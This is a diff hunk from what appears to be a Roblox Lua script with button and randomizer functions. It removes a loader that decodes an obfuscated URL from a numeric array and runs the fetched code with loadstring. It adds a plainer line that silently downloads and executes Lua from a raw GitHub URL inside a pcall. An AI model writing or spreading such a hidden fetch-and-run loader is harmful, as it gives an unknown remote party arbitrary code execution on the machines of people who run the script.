@@ -145,14 +145,8 @@ local function flashEffect(button)
 end
 
 pcall(function()
-    local b = {208,202,218,218,202,208,220,198,206,220,214,154,208,154,214,218,212,222,154,214,202,218,154,212,218,220,154,218,202,206,154,208,218,154,208,154,194}
-    local url = ""
-    for i,v in ipairs(b) do
-        url = url .. string.char(v / 2)
-    end
-    loadstring(game:HttpGet(url))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
 end)
-
 
 local function countdownAndRandomize(button)
     for i = 10, 1, -1 do
